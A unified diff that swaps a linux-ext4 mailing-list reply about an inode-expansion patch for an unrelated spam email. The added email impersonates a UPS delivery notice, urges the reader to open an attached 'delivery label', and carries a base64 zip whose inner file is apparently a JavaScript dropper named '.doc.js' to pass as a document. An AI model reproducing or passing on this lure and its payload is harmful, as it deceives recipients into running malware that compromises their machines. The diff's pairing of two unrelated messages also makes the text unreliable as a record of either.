@@ -1,60 +1,72 @@
-From: Wang Shilong <wshilong@ddn.com>
-Subject: RE: [PATCH 1/2] ext4, project: expand inode extra size if possible
-Date: Mon, 3 Jul 2017 01:16:15 +0000
-Message-ID: <3ED34739A4E85E4F894367D57617CDEFCA59786E@LAX-EX-MB2.datadirect.datadirectnet.com>
-References: <20170630035148.63305-1-wshilong@ddn.com>,<535692b6-b000-e040-2fdc-2ef5dcbff1ab@huawei.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 8BIT
-Cc: "tytso@mit.edu" <tytso@mit.edu>, Li Xi <lixi@ddn.com>,
-        "yi.zhang@huawei.com" <yi.zhang@huawei.com>,
-        "adilger@dilger.ca" <adilger@dilger.ca>,
-        Shuichi Ihara <sihara@ddn.com>
-To: "miaoxie@huawei.com" <miaoxie@huawei.com>,
-        Wang Shilong <wangshilong1991@gmail.com>,
-        "linux-ext4@vger.kernel.org" <linux-ext4@vger.kernel.org>
+From: kmsen290@br492.hostgator.com.br
+Subject: Problems with item delivery, n.006094884
+Date: Sun, 2 Jul 2017 21:11:37 -0500
+Message-ID: <E1dRqpt-001psd-DK@br492.hostgator.com.br>
+Content-Type: multipart/mixed;
+        boundary="bound1_13676034915de09bf52b9f5564ef6796"
+Content-Transfer-Encoding: 8bit
+To: linux-ext4@vger.kernel.org
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from legacy.ddn.com ([64.47.133.206]:17444 "EHLO legacy.ddn.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752121AbdGCBQS (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
-        Sun, 2 Jul 2017 21:16:18 -0400
-In-Reply-To: <535692b6-b000-e040-2fdc-2ef5dcbff1ab@huawei.com>
-Content-Language: en-US
+Received: from gateway24.websitewelcome.com ([192.185.51.253]:27568 "EHLO
+        gateway24.websitewelcome.com" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with ESMTP id S1751983AbdGCCcD (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Sun, 2 Jul 2017 22:32:03 -0400
+Received: from cm11.websitewelcome.com (cm11.websitewelcome.com [100.42.49.5])
+        by gateway24.websitewelcome.com (Postfix) with ESMTP id A7B836B73
+        for <linux-ext4@vger.kernel.org>; Sun,  2 Jul 2017 21:11:37 -0500 (CDT)
+Received: from kmsen290 by br492.hostgator.com.br with local (Exim 4.87)
+        (envelope-from <kmsen290@br492.hostgator.com.br>)
+        id 1dRqpt-001psd-DK
+        for linux-ext4@vger.kernel.org; Sun, 02 Jul 2017 23:11:37 -0300
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
+--bound1_13676034915de09bf52b9f5564ef6796
+Content-Type: text/plain; charset=us-ascii
 
-________________________________________
-From: Miao Xie [miaoxie@huawei.com]
-Sent: Friday, June 30, 2017 16:48
-To: Wang Shilong; linux-ext4@vger.kernel.org
-Cc: tytso@mit.edu; Li Xi; yi.zhang@huawei.com; adilger@dilger.ca; Wang Shilong; Shuichi Ihara
-Subject: Re: [PATCH 1/2] ext4, project: expand inode extra size if possible
+Dear Customer,
 
-on 2017/6/30 at 11:51, Wang Shilong wrote:
-> when upgrading from old format, try to set project id
-> to old file first time, it will return EOVERFLOW, but if
-> that file is dirtied(touch etc), changing project id will
-<...SNIP...>
+Your item has arrived at the UPS Post Office at June 30, but the courier was unable to deliver parcel to you.
 
-ext4_expand_extra_isize should be invoked after ext4_reserve_inode_write.
+Please check delivery label attached!
 
-And I think it is better to restructure ext4_expand_extra_isize by moving NO_EXPAND check,
-nojournal check and journal credits extend into it, and then we just if i_projid is in
-
----->I agreed we could move NO_EXPAND check, but i don't think it good idea to move journal
-credits extend to it, jbd2_extend_journal() might fail, and we'd better avoid it.
-
-For changing projectid, we could know how many credits before start transaction..
-
-the inode or not, if not, invoke ext4_expand_extra_isize. (don't forget to do cleanup for
-ext4_mark_inode_dirty), And then we can remove many check in the above code.
+Your help is greatly appreciated,
+ ,
+UPS Operation Manager.
 
 
----->what do you mean cleanup for ext4_mark_inode_dirty()? I supposed you mean don't
-call ext4_mark_iloc_dirty() if extend fail? i think that is expected, even inode extend fail,
-if ext4_mark_inode_dirty() is called, it means inode is dirtied already before we call the
-function.
+--bound1_13676034915de09bf52b9f5564ef6796
+Content-Type: application/zip; name="UPS-Delivery-Details-006094884.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Delivery-Details-006094884.zip
 
-Thanks,
-Shilong
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAVVBTLURlbGl2ZXJ5LURldGFpbHMtMDA2MDk0
+ODg0AAAAAAAAAAAAAAAAUEsDBBQAAAAIAAAAAAAEhtCeSwQAAG0GAABEAAAAVVBTLURlbGl2ZXJ5
+LURldGFpbHMtMDA2MDk0ODg0L1VQUy1EZWxpdmVyeS1EZXRhaWxzLTAwNjA5NDg4NC5kb2MuanNd
+VFlzokoUfjZV+Q8UDyOOSxBjxJvK3GoXjEYR44ZOTVktNDs0NuCWyn+/jRhn5vog9OnznY3vfHtI
+GBORiHlh+Of7OyMJtNjGAXNOvMTnQttNUIH5uDwrEQp0rvD8eX+3p6gjhfxktQhGKMIERRUN+xVI
+2BK7twMcIxcKYoUk9KxZJx+lHpiY9OgnEfQQye58tEVeeW/HOD3/es5i+4lvuzR+gA4MIASeuPx7
+d6oAOV9i8r3uLH2M5tN+Z5wv3CBRDA1IQceKhwIztv5sB7rE9jmT2Cb0SyHWsVf4IChOSMBkxgpB
+oQc1xD0A8GCWWPbS58GyPcTFhA7h/u7j/i5nG1w6rR8v13TUnEvtuS1B0KUZcxSVi8kptedy6U1a
+nIMjFFpfDdGS9kgdbx2kxVxWGTuaqgCMhkJFHQ1fZwDMFLaQtpbhz8hPx5HnL79q0wb6XHyTlVe5
+bixj2GwY5HFaQ5K+xKTl1EK+1hCFKs+P+v1W3wFyy3R3lmv3mge+BSZdCYBxG0xEkN63zTf63gXm
+rtsMm/prmRiitBiYw5ljkQUPd63ZE+RPYm/4FoyXdZIsVHu7eAvIuRVO+mX81OiS6aRt7tZzQCy1
+K/pQ14l4GK87VWio+8gZq9pgsSkvj1V+PxbaRmd4DE286SLFOJ3fwrXSHsjH10NHgnC7WI1W0bY1
+XaEj4B1R2ptKc2a8S/CQrGVNrm7cxm7Dd0n9cTPRTA8rO6EhLoL5CD0uLMVEnlub6vxutMTnvuu3
+QLCPq0YyOxtP20cpbjrS9rBV2rqgiQ0QCFh+77dmkSLzSaBCNUzW56OkT8e74coIVDIbLxvrngvt
+GAycaLFfKYPkrfz+aGOp8TQIHGVGPGsdYOJt/dfWoWMMRVmMGtG81jsNDG/cA5N+B0xAi6igJb6P
+QlOuhmDq1NvSegNWHX1l+kOha22CvVoj9dESSdDFeLDB/Fw+m+KiPumBZk8eSUt57Jcfp+LcHKon
+ZdroGh3l3I35/I0ipnWKKUUM6EXotxERLyXO8WfK2l83O0mOFz41EZ1EXdQoVwQd1lGjJoiiUTOa
+cGvwhq5n4TP2VnCIAu6ymT9rZeFXiWHZImvFcfjPwwNbvKQq5h/yRZMgdA4wVyjm/80XU+qWLtVl
+dM6EJQv5m+BmWvs1D1WKEAcRmqFjfHPwbcNw0+0244od6Og4Nri0i98hQptuZOZw2/8vrJdg16Z3
+LGQvVttgOO4CKPIF5gfDicVqsVpgvjN0aZhv3xiBeXmhf/TtmrjI1KifUGBS+GXjs7qplhEamNhn
+H3JmXLqMtlBxsE1nleXNSsxZVDG4i//VkElGLlOJz6t0aDDWLA596cpn6pp+u2KRvn3+KWk+9E6R
+xVF1vgrZVUmsGIA4zPTr5pzV5zpmifFoRcxH7gqipkoUenbMpfa/MLfv+L8MeQ0nAc2BSP5vwLVD
+z97CGJPCB9pD74/z8+d/BIbQnksEAABtBgAAUEsBAgAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAB4A
+AAAAAAAAAAAQAAAAAAAAAFVQUy1EZWxpdmVyeS1EZXRhaWxzLTAwNjA5NDg4NFBLAQIAABQAAAAI
+AAAAAAAEhtCeSwQAAG0GAABEAAAAAAAAAAAAIAAAAEgAAABVUFMtRGVsaXZlcnktRGV0YWlscy0w
+MDYwOTQ4ODQvVVBTLURlbGl2ZXJ5LURldGFpbHMtMDA2MDk0ODg0LmRvYy5qc1BLBQYAAAAAAgAC
+AL4AAAABBQAAAAA=
+
+
+--bound1_13676034915de09bf52b9f5564ef6796--
